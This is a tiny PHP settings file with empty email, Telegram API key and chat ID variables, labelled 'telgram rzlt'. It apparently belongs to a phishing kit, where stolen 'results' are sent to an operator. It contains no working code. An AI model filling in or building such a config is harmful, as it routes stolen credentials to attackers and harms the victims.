<?php


$email =""; 

//telgram rzlt
$api = "";
$chatid = "";


?>